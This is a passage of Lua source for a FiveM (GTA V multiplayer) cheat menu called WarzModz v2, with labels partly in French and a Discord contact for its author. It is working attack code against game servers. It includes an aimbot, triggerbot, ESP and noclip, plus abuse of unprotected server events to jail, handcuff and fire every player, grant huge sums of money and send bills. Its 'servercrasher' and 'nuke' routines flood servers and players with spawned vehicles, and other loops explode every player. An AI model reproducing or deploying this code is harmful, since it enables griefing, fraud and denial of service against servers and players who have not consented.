										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end
			
						if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent('cuffServer', GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(i))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				end
	  
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

			if esp then
				for i = 0, 128 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~g~~h~" ..
							GetPlayerName(i) ..
										"\n~h~~b~ Dist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, false), 1)
				
						DrawText3D(x, y, z + 1.0, message, 255, 255, 255)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					end
				end
			end

			if supergrip then
				SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), CHandlingData, fTractionCurveMin, 1000000)
			end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if blowall then
                for i = 0, 128 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			if banallusers then
				for i = 0, 128 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Warz")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " WarzModz#0001 ")
					end
				end

			if esxdestroy then
				for i = 0, 128 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Warz Menu", 10000000)
				end
			end
			
			if servercrasher then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
				CreateVehicle(GetHashKey(avion), 0, 0, -10, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(avion2), 0, 3, -1000, true, true)
				CreateVehicle(GetHashKey(avion2), 1621, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion2), 1242, 1, -100, true, true)
				CreateVehicle(GetHashKey(camion), 612, 4, -10, true, true)
				CreateVehicle(GetHashKey(camion), 1234, 0, -50, true, true)
				CreateVehicle(GetHashKey(camion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(random), 512, 1233, -10, true, true)
				CreateVehicle(GetHashKey(random), 155, 2, -50, true, true)
				CreateVehicle(GetHashKey(random), 333, 0, -100, true, true)
				CreateVehicle(GetHashKey(heli), -121, 100, -10, true, true)
				CreateVehicle(GetHashKey(heli), -121, 2555, -50, true, true)
				CreateVehicle(GetHashKey(heli), -121, 123, -100, true, true)
			end

			if nuke then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                for i = 0, 128 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)

						local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end
			
			if BlowDrugsUp then
				TriggerServerEvent("esx_drugs:startHarvestWeed")
				TriggerServerEvent("esx_drugs:startHarvestCoke")
				TriggerServerEvent("esx_drugs:startHarvestMeth")
				TriggerServerEvent("esx_drugs:startHarvestOpium")
				TriggerServerEvent("esx_drugs:startTransformWeed")
				TriggerServerEvent("esx_drugs:startTransformCoke")
				TriggerServerEvent("esx_drugs:startTransformMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startSellWeed")
				TriggerServerEvent("esx_drugs:startSellCoke")
				TriggerServerEvent("esx_drugs:startSellMeth")
				TriggerServerEvent("esx_drugs:startSellOpium")
			end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 118) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 109) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if TriggerBot then
				local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if Aiming then
					if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						ShootPlayer(Entity)
					end
				end
			end

			if AimBot then
				SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
				local gotEntity = getEntity(PlayerId())
				if IsEntityAPed(gotEntity) then
					if IsPedInAnyVehicle(gotEntity, true) then
						if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
							if IsControlJustReleased(1, 69) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						else
							if IsControlJustReleased(1, 142) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						end
					end
				elseif IsEntityAVehicle(gotEntity) then
					if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
						if IsControlJustReleased(1, 69) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					else
						if IsControlJustReleased(1, 142) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					end
				end
			else
				SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
			end
 
			if blowall then
                for i = 0, 64 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			DisplayRadar(true)

			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end

			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local newPos = GetEntityCoords(entity)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local yoff = 0.0
				local zoff = 0.0

				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end

				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)

				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)

function GetPlayers()
	local players = {}

	for i = 0, 31 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end

	return players
end


function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1


		Warz.CreateMenu("MainMenu", "~p~WarzModz v2")
		Warz.SetSubTitle("MainMenu", "                    ~p~» Warz Best Menu «       ")
		Warz.CreateSubMenu("SelfMenu", "MainMenu", "PlayerMenu")
		Warz.CreateSubMenu("World", "MainMenu", "World")
		Warz.CreateSubMenu("Property", "MainMenu", "Property")
		Warz.CreateSubMenu("Fuck", "MainMenu", "Fuck")
		Warz.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		Warz.CreateSubMenu("CarTypes", "VehMenu", "Vehicles")
		Warz.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Hihi')
        Warz.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
		Warz.CreateSubMenu('BoostMenu', 'VehMenu', 'Vehicle Boost')
		Warz.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		Warz.CreateSubMenu("Credits", "MainMenu", "CREDITSsss")
		Warz.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		Warz.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		Warz.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		Warz.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		Warz.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		Warz.CreateSubMenu("WeaponTypes", "WepMenu", "Weapons")
        Warz.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon")
        Warz.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options")
        Warz.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options")
		Warz.CreateSubMenu("Ammu-NationCraft", "WepMenu", "Ammu-Nation Crafter")
		Warz.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		Warz.CreateSubMenu("ESXMoney", "ServerMenu", "Money Options")
		Warz.CreateSubMenu("ESXMisc", "ServerMenu", "Recrute Players Options")
		Warz.CreateSubMenu("Recrute2", "ServerMenu", "Recrute Players Options2")
		Warz.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		Warz.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		Warz.CreateSubMenu("RecrutePlayers", "ServerMenu", "Recrute Players")
		Warz.CreateSubMenu("RecrutePlayers2", "ServerMenu", "Recrute Players")
		Warz.CreateSubMenu("RecrutePlayersOptions", "RecrutePlayers", "Recrute Players options")
		Warz.CreateSubMenu("RecrutePlayersOptions2", "RecrutePlayers2", "Recrute Players options")
		for i, dE in pairs(bm) do
            Warz.CreateSubMenu(dE.id, 'performance', dE.name)
        end						
		local SelectedPlayer

		while Enabled do
			if Warz.IsMenuOpened("MainMenu") then
			    drawNotification("~p~WarzModz v2.0")
				drawNotification("Discord: ~n~~p~WarzModz#0001")
				   if Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Player ~s~Menu ~p~«", "SelfMenu") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Online ~s~Players ~p~«", "OnlinePlayerMenu") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Monde ~s~Menu ~p~«", "World") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Propriété ~s~Menu ~p~«", "Property") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Teleport ~s~Menu ~p~«", "TeleportMenu") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Vehicles ~s~Menu ~p~«", "VehMenu") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Arme ~s~Menu ~p~«", "WepMenu") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~Fuck ~s~Server ~p~«", "Fuck") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>~p~» ~s~LUA ~s~MENU ~p~«", "ServerMenu") then
				elseif Warz.MenuButton("~h~<FONT COLOR='#FF0000'>                        ~p~» ~p~*~s~CREDITS* ~p~«", "Credits") then
				elseif Warz.Button("~h~<FONT COLOR='#FF0000'>~p~» ~s~Fermé ~s~Le ~s~Menu ~p~«") then
					Enabled = false
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("SelfMenu") then
				if
					Warz.CheckBox(
						"~h~Invinsible",
						Godmode,
						function(enabled)
							Godmode = enabled
						end
					)
				 then
				elseif Warz.Button("~h~~p~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif Warz.Button("~s~Revivre") then
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif Warz.Button("~h~~g~Guérir") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif Warz.Button("~h~~b~Armure") then
					SetPedArmour(PlayerPedId(), 200)
				elseif Warz.Button("Donner un article") then
					local result = KeyboardInput("Name of Item you want", "", 100000000)
					if result then
					TriggerServerEvent('esx_ambulancejob:giveItem', result)
					end
				elseif Warz.Button("Permis De Conduire") then
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
				elseif Warz.Button("Manger a ~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif Warz.Button("Boire a ~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif
				Warz.CheckBox("~h~Endurance infinie",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				Warz.CheckBox(
					"~h~Super Saut",
					SuperJump,
					function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				Warz.CheckBox(
					"~h~Poing Explosif",
					ePunch,
					function(enabled)
					ePunch = enabled
					end)
				then
				elseif
				Warz.CheckBox("~h~Courire Vite",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				Warz.CheckBox(
					"~h~Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				Warz.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then
				elseif Warz.Button("~r~Quitter Le Serveur") then
					TriggerServerEvent("kickForBeingAnAFKDouchebag")
				end

		Warz.Display()
			elseif Warz.IsMenuOpened("TeleportMenu") then
				if Warz.Button("~h~Teleport ~h~~g~Waypoint") then
				TeleportToWaypoint()
			 elseif Warz.Button("~h~Teleport ~h~~g~Vehicle ~p~FIX ") then
					drawNotification("~y~T'arrive Dans Un Véhicule Tkt")
					local playerPed = GetPlayerPed(-1)
					local playerPedPos = GetEntityCoords(playerPed, true)
					local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
					local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
					local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
					local NearestPlanePos = GetEntityCoords(NearestPlane, true)
				drawNotification("~y~à la recherche de véhicules...")
				Citizen.Wait(1000)
				if (NearestVehicle == 0) and (NearestPlane == 0) then
					drawNotification("~p~Aucun Véhicule Trouvé")
				elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
					if IsVehicleSeatFree(NearestPlane, -1) then
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					end
					drawNotification("~g~Téléporté dans le véhicule")
				elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
					if IsVehicleSeatFree(NearestVehicle, -1) then
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					end
					drawNotification("~g~Téléporté dans le véhicule")
				elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
					if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestVehicle, -1) then
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						end
					elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestPlane, -1) then
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						end
					end
					drawNotification("~g~Téléporté Dans Le Véhicule")
				end
 
			 end

		Warz.Display()
			elseif Warz.IsMenuOpened("World") then
			if
				Warz.CheckBox(
				"~h~ESP",
				esp,
				function(enabled)
				esp = enabled
				end)
			then
			elseif
				Warz.CheckBox(
				"~h~Voire Les Joueur Sur La Map",
				playerBlips,
				function(enabled)
				playerBlips = enabled
				end)
			then
			elseif
				Warz.CheckBox(
				"~p~Effacer tous les véhicules",
				destroyvehicles,
				function(enabled)
				destroyvehicles = enabled
				end) 
			then
			elseif
				Warz.CheckBox(
				"~h~~p~Exploser tous Les Véhicules",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
			end
			
		Warz.Display()
		elseif Warz.IsMenuOpened("Property") then
		if Warz.Button("~o~              Must Have Money to buy        ") then
		elseif Warz.Button("~h~~b~Acheter Appartement Bas de Gamme ~p~(Cheapest)") then
			TriggerServerEvent('esx_property:buyProperty', 'LowEndApartment')
		elseif Warz.Button("~h~~b~Acheter Del Perro Heights 7 ~p~ (Expensive)") then
			TriggerServerEvent('esx_property:buyProperty', 'DellPerroHeightst7')
		elseif Warz.Button("~h~~b~Acheter Une Propriété Personnalisée") then
			local result = KeyboardInput("Entrez Le Nom De La Propriété", "", 100000000)
			if result then
			TriggerServerEvent('esx_property:buyProperty', result)
			end
		elseif Warz.Button("~h~~b~Louer Une Propriété Personnalisée") then
			local result = KeyboardInput("Enter name of Property", "", 100000000)
			if result then
			TriggerServerEvent('esx_property:rentProperty', result)
			end
		elseif Warz.Button("~o~                    Noms De Propriété        ") then
		elseif Warz.Button("WhispymoundDrive") then
		elseif Warz.Button("NorthConkerAvenue2045") then
		elseif Warz.Button("RichardMajesticApt2") then
		elseif Warz.Button("NorthConkerAvenue2044") then
		elseif Warz.Button("WildOatsDrive") then
		elseif Warz.Button("HillcrestAvenue2862") then
		elseif Warz.Button("LowEndApartment") then
		elseif Warz.Button("MadWayneThunder") then
		elseif Warz.Button("HillcrestAvenue2874") then
		elseif Warz.Button("HillcrestAvenue2868") then
		elseif Warz.Button("TinselTowersApt12") then
		elseif Warz.Button("MiltonDrive") then
		elseif Warz.Button("Modern1Apartment") then
		elseif Warz.Button("Modern2Apartment") then
		elseif Warz.Button("Modern3Apartment") then
		elseif Warz.Button("Mody1Apartment") then
		elseif Warz.Button("Mody2Apartment") then
		elseif Warz.Button("Mody3Apartment") then
		elseif Warz.Button("Vibrant1Apartment") then
		elseif Warz.Button("Vibrant2Apartment") then
		elseif Warz.Button("Vibrant3Apartment") then
		elseif Warz.Button("Sharp1Apartment") then
		elseif Warz.Button("Sharp2Apartment") then
		elseif Warz.Button("Sharp3Apartment") then
		elseif Warz.Button("Monochrome1Apartment") then
		elseif Warz.Button("Monochrome2Apartment") then
		elseif Warz.Button("Monochrome3Apartment") then
		elseif Warz.Button("Seductive1Apartment") then
		elseif Warz.Button("Seductive2Apartment") then
		elseif Warz.Button("Seductive3Apartment") then
		elseif Warz.Button("Regal1Apartment") then
		elseif Warz.Button("Regal2Apartment") then
		elseif Warz.Button("Regal3Apartment") then
		elseif Warz.Button("Aqua1Apartment") then
		elseif Warz.Button("Aqua2Apartment") then
		elseif Warz.Button("Aqua3Apartment") then
		elseif Warz.Button("IntegrityWay") then
		elseif Warz.Button("IntegrityWay28") then
		elseif Warz.Button("IntegrityWay30") then
		elseif Warz.Button("DellPerroHeights") then
		elseif Warz.Button("DellPerroHeights4") then
		elseif Warz.Button("DellPerroHeights7") then		
		end
		
		Warz.Display()
		elseif Warz.IsMenuOpened("Fuck") then
		if Warz.Button("~h~~p~Donner Toutes Les Armes ~s~~h~Joueurs") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif Warz.Button("~h~~p~Server Alert") then
					local result = KeyboardInput("Nom Du Titre", "", 100000000)
					local result2 = KeyboardInput("Description", "",100000000)
					if result and result2 then
					TriggerServerEvent("alert:sv", result, result2)
					end
				elseif Warz.Button("~p~Supprimer toutes les armes ~s~~h~Joueurs") then
					for ids = 0, 128 do
